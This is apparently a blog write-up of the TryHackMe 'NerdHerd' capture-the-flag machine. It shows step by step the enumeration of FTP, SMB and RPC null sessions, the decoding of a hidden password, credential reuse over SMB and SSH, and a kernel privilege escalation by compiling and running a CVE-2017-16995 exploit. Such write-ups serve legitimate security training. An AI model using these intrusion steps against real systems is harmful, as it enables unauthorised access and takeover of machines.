<h2 id="Overview">Overview</h2>

My Writeup Explainning my approach Owning [NerdHerd](https://tryhackme.com/room/nerdherd) machine, Created by my friend [0xpr0N3rd](https://tryhackme.com/p/0xpr0N3rd), That i really had a good time solving it.

We start with a quick nmap scan to kick things off.

```

Well, nmap got us something : 
- FTP service (21)
- SSH service (22)
- SMB server (445 - 139)
- A Web server on port (1337)

Trying to login into FTP anonymously, we got a **.png** image

```
m3dsec@local:~/nerdherd.thm$ ncftp 10.10.101.50

```


Inspecting the image, we got the owner name, which is a little bit weird tho, it doesn't sound like a name.

```
m3dsec@local:~/nerdherd.thm/files/ftp$ exiftool youfoundme.png |grep -i owner
Owner Name                      : fijbxslz
```

`fijbxslz` looks like an encoded/rotated string, that we need to decode, but for now lets just save it, it may be usefull later.

<h4 id="SMB-Enueration">SMB Enumeration</h4>

As far as i go, SMB is one of the 1st services that i start pocking arround with.

Anonymously we can list shares, **nerdherd_classified** folder seems interesting, but we'll need a password to get read access, so lets keep moving

```
smbmap -P 445 -H 10.10.101.50 -d WORKGROUP
[+] Guest session   	IP: 10.10.101.50:445	Name: nerdherd.thm

	----                                                  	-----------	-------

	nerdherd_classified                               	NO ACCESS	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (nerdherd server (Samba, Ubuntu))
```

<h4 id="RPC-Enumeration">RPC Enumeration</h4>

Its always a good idea to test if the [rpc](https://en.wikipedia.org/wiki/Remote_procedure_call) system is vulnerable to [null session attack](https://www.dummies.com/programming/networking/null-session-attacks-and-how-to-avoid-them/).
letâ€™s see what we can do with a null session.

```
m3dsec@local:~/nerdherd.thm$ rpcclient -U '' 10.10.101.50
Enter WORKGROUP\'s password: 
rpcclient $> enumdomusers
user:[chuck] rid:[0x3e8]
rpcclient $> queryuser chuck
	User Name   :	chuck
	Full Name   :	ChuckBartowski
	Home Drive  :	\\nerdherd\chuck
	Dir Drive   :	
	Profile Path:	\\nerdherd\chuck\profile
rpcclient $> getdompwinfo
min_password_length: 5
password_properties: 0x00000000
rpcclient $> netshareenumall
netname: print$
	remark:	Printer Drivers
	path:	C:\var\lib\samba\printers
	password:	
netname: nerdherd_classified
	remark:	Samba on Ubuntu
	path:	C:\home\chuck\nerdherd_classified
	password:	
netname: IPC$
	remark:	IPC Service (nerdherd server (Samba, Ubuntu))
	path:	C:\tmp
	password:

```

From the above, we can conclude a few things:
1. The system is vulnerable to a null session attack.
2. The null session allow us to enumerate users, shares, password policies.
3. The most important info in this case is the username

<h4 id="Web-Server-Enumeration">Web Server Enumeration</h4>

Well, on this particular part, there is some rabbit holes u can fall into.

For example trying to bypass the login form on http://10.10.101.50:1337/admin/

At the end of the index page, it says `Maybe the answer is in here.`and its poiting to a [song in youtube](https://www.youtube.com/watch?v=9Gc4QTqslN4)

After being stuck for some time, i got a pretty big hint from a good friend of mine [0xpr0N3rd](https://tryhackme.com/p/0xpr0N3rd) aka the creator of the machine, and he says `bird is the word`, i was like whaat :joy:

And yes, if u listen closely to the song in that video, u'll see that the the whole lyrics are `bird is the word`


I tried to decode the eariler retrived string with the word bird

```
fijbxslz -> vignere decode (bird) -> easywkuw
fijbxslz -> vignere decode (birdistheword) -> easypass
```

Now we have a meaningfull password, i'll assume **chuck** password is **easypass**, and i will try it against previous services.


<br>
<h4 id="SMB-Access">SMB Access</h4>

The previously retrived credentials, worked over smb and now we have **READ** permission over **nerdherd_classified** folder

```
m3dsec@local:~/nerdherd.thm/files/ftp$ smbmap -P 445 -H 10.10.101.50 -d WORKGROUP -u chuck -p easypass 
[+] IP: 10.10.101.50:445	Name: nerdherd.thm                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	nerdherd_classified                               	READ ONLY	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (nerdherd server (Samba, Ubuntu))
```

Download the secret file from smb

```
m3dsec@local:~/nerdherd.thm/files/smb$ smbclient -U chuck \\\\10.10.101.50\\nerdherd_classified

Ssssh! don't tell this anyone because you deserved it this far:

Sincerely,
0xpr0N3rd <3
```

[0xpr0N3rd](https://tryhackme.com/p/0xpr0N3rd) have something for us, lets see what it is

```
m3dsec@local:~/nerdherd.thm/files/smb$ curl 10.10.101.50:1337/this1sn0tadirect0ry/creds.txt
alright, enough with the games.
here, take my ssh creds:
	chuck:th1s41ntmypa5s
```

Good game buddy, we know have ssh credentials.


<br>
<h2 id="Internal-Enumeration">Internal Enumeration:</h2>

With ssh, we got inside the target host as user **chuck**, and we noticed that:
1. the path is exportable.
2. user chuck is a member of sudoers group.
3. we have some pre-installed commpilers.

Normally when i see compilers i go directly and check the kernel version.

```
huck@nerdherd:~$ uname -a
Linux nerdherd 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

In this case [cve-2017-16995](https://www.exploit-db.com/exploits/45010) looks applicable


<br>
<h2 id="Privelege-escalation">Privelege escalation:</h2>

This time i'll be compiling the exploit on the target host, but 1st i'll transfer the exploit source code into the target host with ssh

```
m3dsec@local:~/nerdherd.thm$ scp /home/m3dsec/nerdherd.thm/exploit/cve-2017-16995.c chuck@10.10.101.50:/tmp/cve-2017-16995.c
chuck@10.10.101.50's password: th1s41ntmypa5s
```

Then compile it

```
chuck@nerdherd:/tmp$ gcc cve-2017-16995.c -o cve-2017-16995 -pthread
chuck@nerdherd:/tmp$ ./cve-2017-16995

```

As our object consist of getting the flags, we can do so easly with a grep command

```
root@nerdherd:/# grep -rn 'THM' 2>/dev/null
